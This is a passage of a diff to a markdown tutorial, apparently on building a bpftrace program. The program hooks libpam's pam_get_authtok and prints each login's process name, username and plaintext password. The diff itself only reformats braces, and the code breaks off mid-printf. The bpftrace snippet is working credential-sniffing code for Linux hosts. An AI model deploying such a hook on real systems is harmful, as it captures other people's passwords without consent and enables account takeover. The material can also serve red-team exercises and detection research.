@@ -62,12 +62,15 @@ BEGIN
 Now we create the core of the bpftrace program by hooking the `pam_getauthtok` call, reading the username and the password into a variable and printing them out once the function returns. 
 
 ```
-uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok {
+uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
+{
       @user[tid] = ((struct partial_pam_handle *)arg0)->user;
       @authtok[tid] =  arg2;
 }
     
-uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok /@user[tid]/ {
+uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
+/@user[tid]/ 
+{
   
       printf("Program: %s, Username: %s, AuthTok: %s\n", 
              comm, //process
